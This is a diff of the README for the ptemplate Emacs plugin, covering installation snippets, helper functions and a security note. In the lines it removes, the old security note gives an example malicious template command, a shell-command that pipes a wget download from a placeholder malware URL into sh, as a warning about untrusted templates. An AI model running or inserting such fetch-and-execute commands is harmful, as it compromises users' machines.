@@ -6,11 +6,11 @@ The ptemplate Emacs plugin solves that problem: it lets you define directory
 templates that can contain various files and directories, including yasnippets.
 Such templates ("ptemplates") can even be made intelligent using Emacs Lisp.
 
-However, ptemplate cannot just automate project creation: templates can also be
+However, `ptemplate` cannot just automate project creation: templates can also be
 expanded to existing directories, meaning that things like creating classes
 could also be automated.
 
-Official templates are maintained in a [separate
+The official templates are maintained in a [separate
 repository](https://github.com/nbfalcon/ptemplate-templates.git).
 
 # Features
@@ -142,14 +142,55 @@ Some other useful functions include:
 - `ptemplate-with-file-sandbox`: execute BODY with a detached file map (use to
   modify an inherited template)
 - `ptemplate-in-file-sandbox`: like the above, but call a function instead
-  
-ptemplate also includes facilities to configure snippet-chain buffers further:
+
+`ptemplate` also includes facilities to configure snippet-chain buffers further:
+
 - `ptemplate-snippet-setup`: configure some snippet-chain targets using lisp
   functions, run before snippet insertion.
 - `ptemplate-snippet-setup!`: like the above, but as a macro
 - `ptemplate-set-snippet-kill-p`: in a snippet-chain buffer, can be used to mark
   it as not to be killed.
 - `ptemplate-nokill-snippets`: `ptemplate!`'s :nokill, but as a function.
+
+# Installation
+
+This package can be installed from `MELPA`, so `M-x package-install` should be
+sufficient if you have it configured. `ptemplate` itself includes no templates.
+They are maintained in a separate repository (see #About). A sample
+configuration (leveraging
+[`use-package`](https://github.com/jwiegley/use-package)) could be:
+
+```emacs-lisp
+(use-package ptemplate)
+(use-package ptemplate-templates
+  :no-require t
+  :after (ptemplate)
+  :config (ptemplate-templates-mode 1))
+```
+
+Alternatively, `ptemplate` can be installed from GitHub directly (replace
+`(use-package ptemplate)`):
+
+## [`quelpa`](https://github.com/quelpa/quelpa) + [`use-package`](https://github.com/jwiegley/use-package)
+
+``` emacs-lisp
+(quelpa '(ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
+(use-package ptemplate)
+```
+
+## [`quelpa-use-package`](https://github.com/quelpa/quelpa-use-package)
+
+``` emacs-lisp
+(use-package ptemplate
+  :quelpa (ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
+```
+
+## [`straight-use-package`](https://github.com/raxod502/straight.el)
+
+``` emacs-lisp
+(straight-use-package
+ '(ptemplate :type git :host github :repo "nbfalcon/ptemplate"))
+```
 
 # Configuration
 
@@ -189,59 +230,22 @@ subdirectories for templates (template names).
 
 See above, but for `ptemplate-expand-template`.
 
-# Installation
-
-This package can be installed from `MELPA`, so `M-x package-install` should be
-sufficient if you have MELPA enabled. See the #Configuration section below on
-how to get started.
-
-Alternatively, it can be downloded from github directly:
-
-## `quelpa` + `use-package`
-
-``` emacs-lisp
-(quelpa '(ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
-(use-package ptemplate)
-```
-
-## `quelpa-use-package`
-
-``` emacs-lisp
-(use-package ptemplate
-  :quelpa (ptemplate :fetcher github :repo "nbfalcon/ptemplate"))
-```
-
-## `straight-use-package`
-
-``` emacs-lisp
-(straight-use-package
- '(ptemplate :type git :host github :repo "nbfalcon/ptemplate"))
-```
-
 # Security note
 
-Due to the smart expansion feature, and due to allowing yasnippets in templates,
-ptemplate is *not* secure the same way as a modern browser is, for example. You
-should use only trusted templates. A malicious template could have a snippet
-like the following in its .ptemplate.el or in a \`\` block of one of its
-yasnippets:
+Allowing `yasnippet`s and smart expansion using `.ptemplate.el` allows any
+template to execute arbitrary code in the context of the current Emacs session
+with no further confinement, with the same capabilities that any other Emacs
+plugin has. This means that a malicious template could inject rootkits, ….
 
-```emacs-lisp
-(shell-command "wget $SH_MALWARE_URL | sh")
-```
-
-At that point, it's game over: the malware shell script could inject itself into
-all files you own (.profile "rootkits" for example), nuke your home directory or
-do lots of other evil things. However, that is a problem with software in
-general (*any* Emacs plugin could do the same) and not specific to ptemplate.
-
-Removing that feature or making it optional would be pretty pointless, as it
-would degrade ptemplate to simply being a fronted to `cp -R`.
+Removing those features or making them optional makes no sense, as doing so
+would degrade `ptemplate` to simply being a fronted to `cp -R`.
 
 # Test suite
 
-Ptemplate has a test-suite, which can be found in `test/`, and can be run with
-`cask exec ert-runner`. A part of it involves comparing directories recursively,
-which is done using the `diff` utility (only tested with GNU diff). You can
-configure a different diff command to use by setting the environment variable
-`PTEMPLATE_TEST_DIFF_CMD`.
+`ptemplate` has an `ert-runner`-based test-suite which can be found in the
+`test/` subdirectory. It can be run by executing `cask exec ert-runner` at the
+project's root.
+
+A part of it has to compare directories recursively, which is done using the GNU
+`diff` utility. You can configure a different diff command by setting the
+environment variable `PTEMPLATE_TEST_DIFF_CMD`.
